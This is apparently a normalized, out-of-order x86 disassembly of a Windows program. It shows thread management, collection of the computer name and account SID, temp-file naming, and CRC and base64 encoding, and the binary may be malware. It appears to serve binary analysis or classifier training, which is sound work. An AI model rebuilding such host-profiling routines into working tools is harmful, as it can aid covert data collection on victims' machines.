mov ecx [ ecx + 0x4 ]
mov [ eax + 0x14 ] ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x1c
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x4 ]
add ecx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x24 ]
add eax 0x3a
mov [ ebp - 0x8 ] eax
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
add eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
push 0x10
push rw-data
push [ ebp - 0x4 ]
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
add eax 0x10
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
mov al 0x1
xor al al
jmp r-xdata
leave
retn
sub_415176
push ebp
mov ebp esp
push 0xffffffff
push sub_423869
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x18 ] eax
and [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x14 ]
push [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
push [ eax + 0x4 ]
push [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
imul eax eax 0x14
mov ecx [ ebp - 0x18 ]
call [ ecx + eax ]
add esp 0xc
mov ecx [ ebp - 0x14 ]
mov [ ecx + 0x10 ] al
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4151ff
push ebp
mov ebp esp
push 0x186a0
push [ ebp + 0x8 ]
call sub_40103d
pop ecx
pop ecx
push 0x10
push rw-data
mov eax [ ebp + 0x8 ]
add eax 0xc
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp + 0x8 ]
and [ eax + 0x8 ] 0x0
pop ebp
retn
sub_415230
push ebp
mov ebp esp
sub esp 0x14
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax 0x10
cmp [ ebp - 0x14 ] eax
jge r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
movzx eax [ eax ]
movzx ecx [ rw-data ]
cmp eax ecx
jne r-xdata
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
push eax
call sub_415054
pop ecx
movzx eax al
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x10
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x24 ]
add eax 0x32
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
cmp ecx [ eax ]
jle r-xdata
push [ ebp - 0x8 ]
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_4158b4
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x24 ]
cmp eax [ ecx ]
jae r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
cmp ecx [ eax ]
jne r-xdata
leave
retn
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax 0x10
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax ]
sub eax 0x8
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
sub_415323
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
add eax 0x18
push eax
call sub_414299
mov edx [ ebp - 0x4 ]
mov ecx eax
call sub_4158b4
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
lea eax [ ecx + eax + 0x1c ]
mov [ ebp - 0x4 ] eax
push 0x4
lea eax [ ebp - 0x8 ]
push eax
push [ ebp - 0x4 ]
call sub_4026b0
add esp 0xc
leave
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0x10
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
sub_41539e
push ebp
mov ebp esp
push ecx
call sub_414299
mov edx 0x188a0
mov ecx eax
call sub_417318
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xdeadface
push 0x10
push rw-data
mov eax [ ebp - 0x4 ]
add eax 0xc
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
xor eax eax
jmp r-xdata
leave
retn
sub_4153fb
push ebp
mov ebp esp
sub esp 0x54
call sub_413925
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
and [ ebp - 0x1c ] 0x0
xor eax eax
leave
retn 0x4
push 0x1388
call [ Sleep@IAT ]
mov ecx rw-data
call sub_401ce5
movzx eax al
test eax eax
jne r-xdata
mov edx rw-data
mov ecx [ ebp - 0x30 ]
call sub_410cc8
movzx eax al
test eax eax
je r-xdata
mov ecx rw-data
call sub_401ce5
movzx eax al
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x30 ]
and [ eax + 0x5768 ] 0x0
mov [ ebp - 0xd ] 0x0
call sub_4137bf
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x30 ]
mov ecx [ ebp - 0x20 ]
sub ecx [ eax + 0x5768 ]
cmp ecx 0xa
jbe r-xdata
mov edx rw-data
mov ecx [ ebp - 0x30 ]
call sub_410c93
push 0x1
call [ ExitThread@IAT ]
xor eax eax
inc eax
je r-xdata
and [ ebp - 0xc ] 0x0
mov eax [ ebp - 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x2c ] 0x1c
and [ ebp - 0x14 ] 0x0
jmp r-xdata
mov [ ebp - 0xd ] 0x1
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x14 ] eax
jge r-xdata
and [ ebp - 0x18 ] 0x0
mov eax [ ebp - 0x14 ]
dec eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x2c ]
add eax 0x4
cmp eax 0x124f8
jbe r-xdata
mov ecx rw-data
call sub_4011e6
mov ecx [ ebp - 0x14 ]
mov eax [ eax + ecx * 4 ]
mov eax [ eax + 0x24 ]
add eax 0x3b
mov [ ebp - 0x48 ] eax
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x2c ]
lea eax [ ecx + eax + 0x14 ]
cmp eax 0x186a0
jbe r-xdata
mov ecx rw-data
call sub_4011f7
cmp eax 0x5dc
jle r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x48 ]
mov ecx [ ebp - 0x2c ]
lea eax [ ecx + eax + 0x10 ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
jmp r-xdata
movzx eax [ ebp - 0xd ]
test eax eax
je r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov edx rw-data
mov ecx [ ebp - 0x30 ]
call sub_410c93
movzx eax [ ebp - 0xd ]
test eax eax
je r-xdata
push [ rw-data ]
call sub_4151ff
pop ecx
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
add eax 0x20
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x1 ] 0x0
push 0x0
push 0x20
push rw-data
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
add eax 0x20
push eax
mov edx [ rw-data ]
mov ecx [ ebp - 0x30 ]
call sub_4180ff
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x14
mov ecx [ ebp - 0x30 ]
push [ ecx + eax + 0xc ]
push [ ebp - 0x8 ]
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x4c ] eax
cmp [ ebp - 0x4c ] 0xffffffff
je r-xdata
jmp r-xdata
push [ rw-data ]
call sub_415323
pop ecx
mov ecx rw-data
call sub_4011e6
mov ecx [ ebp - 0x14 ]
push [ eax + ecx * 4 ]
push [ rw-data ]
call sub_415094
pop ecx
pop ecx
mov ecx rw-data
call sub_4011e6
mov ecx [ ebp - 0x14 ]
mov eax [ eax + ecx * 4 ]
add eax 0x34
mov [ ebp - 0x50 ] eax
mov eax [ ebp - 0x50 ]
movzx eax [ eax ]
or eax 0x1
mov ecx [ ebp - 0x50 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp - 0x24 ]
imul eax eax 0x14
mov ecx [ ebp - 0x30 ]
mov eax [ ecx + eax + 0x10 ]
inc eax
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0x14
mov edx [ ebp - 0x30 ]
mov [ edx + ecx + 0x10 ] eax
push 0x0
push [ ebp - 0x8 ]
call [ TerminateThread@IAT ]
cmp [ ebp - 0x4c ] 0x102
jne r-xdata
movzx eax [ ebp - 0x34 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
mov [ ebp - 0x24 ] eax
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x24 ]
xor edx edx
div [ ecx + 0x280 ]
mov [ ebp - 0x24 ] edx
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
call sub_4137bf
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x5768 ] eax
mov eax [ ebp - 0x30 ]
and [ eax + 0x58ac ] 0x0
mov ecx rw-data
call sub_41053c
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
push [ ebp - 0x8 ]
call [ CloseHandle@IAT ]
movzx eax [ ebp - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ ebp - 0x1c ]
jne r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x30 ]
mov eax [ eax + 0x58ac ]
inc eax
mov ecx [ ebp - 0x30 ]
mov [ ecx + 0x58ac ] eax
and [ ebp - 0x14 ] 0x0
jmp r-xdata
push 0x14
lea eax [ ebp - 0x44 ]
push eax
call sub_40103d
pop ecx
pop ecx
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x3c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea eax [ ebp - 0x44 ]
push eax
push sub_415176
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov ecx rw-data
call sub_4011f7
cmp [ ebp - 0x14 ] eax
jge r-xdata
push 0x1d4c0
call [ Sleep@IAT ]
mov ecx rw-data
call sub_4011e6
mov ecx [ ebp - 0x14 ]
mov eax [ eax + ecx * 4 ]
add eax 0x34
mov [ ebp - 0x54 ] eax
mov eax [ ebp - 0x54 ]
movzx eax [ eax ]
and eax 0xfffffffe
mov ecx [ ebp - 0x54 ]
mov [ ecx ] al
jmp r-xdata
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
sub_41578c
push ebp
mov ebp esp
sub esp 0xc
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x280 ] 0x0
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor al al
jmp r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
leave
retn 0x1c
push [ ebp + 0x18 ]
mov ecx rw-data
call sub_401164
cmp eax 0x12c
jle r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x5768 ] 0x0
jne r-xdata
xor al al
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
mov ecx rw-data
call sub_410ba8
movzx eax al
test eax eax
jne r-xdata
call sub_4137bf
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x5768 ] eax
cmp [ rw-data ] 0x0
jne r-xdata
xor al al
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call sub_41539e
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x5764 ]
call [ GetExitCodeThread@IAT ]
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x5764 ] 0xffffffff
je r-xdata
xor al al
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x5764 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x4 ] 0x103
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push [ ebp - 0x8 ]
push sub_4153fb
push 0x10000
push 0x0
call [ CreateThread@IAT ]
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x5764 ] eax
mov eax [ ebp - 0x8 ]
push [ eax + 0x5764 ]
call [ CloseHandle@IAT ]
mov al 0x1
sub_4158b4
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
and [ ebp - 0x8 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
ja r-xdata
leave
retn 0x4
and [ ebp - 0x8 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
add eax [ ebp - 0x8 ]
movzx eax [ eax ]
xor eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x4 ]
shr ecx 0x8
xor ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
inc eax
mov [ ebp - 0x8 ] eax
sub_415917
push ebp
mov ebp esp
sub esp 0x18
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov [ ebp - 0x14 ] eax
mov ecx [ ebp + 0x8 ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x10 ] eax
and [ ebp - 0x8 ] 0x0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp + 0xc ]
cmp edx [ ecx + eax * 4 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
inc eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
leave
retn 0x8
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ecx + eax * 4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x8 ]
cdq
sub eax edx
sar eax 0x1
add eax [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jl r-xdata
sub_4159a1
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0x8 ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_415917
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x8 ]
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov eax [ ecx + eax * 4 ]
cmp eax [ ebp + 0xc ]
jne r-xdata
push 0x0
mov ecx [ ebp + 0x8 ]
call sub_410af3
mov ecx [ ebp + 0x8 ]
call sub_40100f
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x4 ]
shl eax 0x2
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax * 4 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
lea eax [ ecx + eax * 4 + 0x4 ]
push eax
call sub_4026b0
add esp 0xc
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov [ ecx + eax * 4 ] edx
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_410af3
jmp r-xdata
xor al al
jmp r-xdata
mov al 0x1
leave
retn 0x8
sub_415a51
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0xc ]
call sub_40100f
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
call sub_401000
shr eax 0x2
mov [ ebp - 0x4 ] eax
and [ ebp - 0xc ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
leave
retn 0x8
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push [ ecx + eax * 4 ]
push [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
call sub_4159a1
mov eax [ ebp - 0xc ]
and eax 0xf
jne r-xdata
jmp r-xdata
push 0xa
call [ Sleep@IAT ]
push 0x0
call [ Sleep@IAT ]
mov eax [ ebp - 0xc ]
inc eax
mov [ ebp - 0xc ] eax
sub_415aba
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call sub_410d27
pop ecx
pop ecx
leave
retn 0x4
sub_415ad6
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
leave
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
jbe r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
ja r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_410de0
add esp 0x10
test eax eax
jne r-xdata
xor al al
mov al 0x1
jmp r-xdata
sub_415b25
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
leave
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x1
jbe r-xdata
xor al al
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
ja r-xdata
push [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp - 0x8 ]
push [ ebp + 0xc ]
call sub_410f11
add esp 0x10
mov al 0x1
sub_415b6c
push ebp
mov ebp esp
sub esp 0x228
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x224 ] ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x220 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jle r-xdata
xor al al
movzx eax [ ebp + 0xc ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x228 ]
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
lea eax [ ebp - 0x14 ]
push eax
call [ UuidCreate@IAT ]
test eax eax
jne r-xdata
leave
retn 0x8
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call [ UuidToStringW@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x220 ]
push eax
call [ lstrlenW@IAT ]
movzx eax [ ebp + eax * 2 - 0x222 ]
cmp eax 0x5c
je r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ ebp - 0x4 ]
push eax
call [ RpcStringFreeW@IAT ]
push r--data
lea eax [ ebp - 0x220 ]
push eax
call [ lstrcatW@IAT ]
sub_415c32
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax rw-data
leave
retn
push 0x410
push rw-data
push 0x0
call [ GetModuleFileNameW@IAT ]
sub_415c5b
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor al al
push 0x410
push [ ebp - 0x8 ]
push rw-data
call [ lstrcpynW@IAT ]
mov al 0x1
jmp r-xdata
leave
retn
sub_415c87
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] 0x104
cmp [ rw-data ] 0x0
jne r-xdata
mov eax rw-data
leave
retn
lea eax [ ebp - 0x4 ]
push eax
push rw-data
call [ GetComputerNameW@IAT ]
test eax eax
jne r-xdata
push r--data
push rw-data
call [ lstrcpyW@IAT ]
sub_415cc9
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
shl eax 0x10
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx + 0x1 ]
shl ecx 0x8
or eax ecx
mov ecx [ ebp - 0x14 ]
movzx ecx [ ecx + 0x2 ]
or eax ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
shr eax 0x12
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx ] al
mov eax [ ebp - 0x8 ]
shr eax 0xc
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov eax [ ebp - 0x8 ]
shr eax 0x6
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx + 0x2 ] al
mov eax [ ebp - 0x8 ]
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx + 0x3 ] al
mov eax [ ebp + 0x8 ]
sub eax 0x3
mov [ ebp + 0x8 ] eax
mov eax [ ebp - 0x14 ]
add eax 0x3
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
shl eax 0x10
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x4 ] 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x3 ] 0x3d
mov eax [ ebp + 0x8 ]
dec eax
mov [ ebp + 0x8 ] eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x0
jmp r-xdata
cmp [ ebp + 0x8 ] 0x3
jl r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2 ] 0x3d
mov eax [ ebp - 0x14 ]
movzx eax [ eax ]
shl eax 0x8
or eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0xc ]
shr eax 0x6
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx + 0x2 ] al
jmp r-xdata
mov al 0x1
leave
retn 0x8
mov eax [ ebp - 0xc ]
shr eax 0xc
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx + 0x1 ] al
mov eax [ ebp - 0xc ]
shr eax 0x12
and eax 0x3f
mov ecx [ ebp - 0x4 ]
mov al [ eax + r--data ]
mov [ ecx ] al
sub_415e14
push ebp
mov ebp esp
sub esp 0xa68
push esi
mov [ ebp - 0x618 ] 0xba0da71d
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x410 ]
mov [ ebp - 0x61c ] eax
mov [ ebp - 0x620 ] 0x200
mov [ ebp - 0x4 ] 0x200
mov [ ebp - 0x614 ] 0x200
lea eax [ ebp - 0x620 ]
push eax
mov edx [ ebp - 0x61c ]
mov ecx [ ebp + 0x8 ]
call sub_41026a
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x614 ]
push eax
lea eax [ ebp - 0x610 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x208 ]
push eax
mov eax [ ebp - 0x61c ]
push [ eax ]
push 0x0
call [ LookupAccountSidA@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
pop esi
leave
retn
mov [ ebp - 0xa5c ] 0xba0da71d
push 0x10
push r--data
lea eax [ ebp - 0x638 ]
push eax
call sub_402b50
add esp 0xc
and [ ebp - 0xa60 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa60 ]
cmp eax [ ebp - 0x4 ]
jae r-xdata
and [ ebp - 0xa64 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa60 ]
xor edx edx
push 0x4
pop ecx
div ecx
mov eax [ ebp - 0xa60 ]
movsx ecx [ ebp + eax - 0x208 ]
imul ecx [ ebp - 0xa5c ]
xor ecx [ ebp + edx * 4 - 0x638 ]
mov eax [ ebp - 0xa60 ]
xor edx edx
push 0x4
pop esi
div esi
mov [ ebp + edx * 4 - 0x638 ] ecx
mov eax [ ebp - 0xa5c ]
imul eax eax 0xbc8f
mov [ ebp - 0xa5c ] eax
jmp r-xdata
mov eax [ ebp - 0xa64 ]
cmp eax [ ebp - 0x614 ]
jae r-xdata
mov eax [ ebp - 0xa60 ]
inc eax
mov [ ebp - 0xa60 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x624 ] eax
movzx eax [ ebp - 0x638 ]
or eax 0x1
mov [ ebp - 0xa49 ] al
lea eax [ ebp - 0xa38 ]
mov [ ebp - 0xa50 ] eax
lea eax [ ebp - 0x638 ]
mov [ ebp - 0x628 ] eax
and [ ebp - 0xa68 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xa64 ]
add eax [ ebp - 0x4 ]
xor edx edx
push 0x4
pop ecx
div ecx
mov eax [ ebp - 0xa64 ]
movsx ecx [ ebp + eax - 0x610 ]
imul ecx [ ebp - 0xa5c ]
xor ecx [ ebp + edx * 4 - 0x638 ]
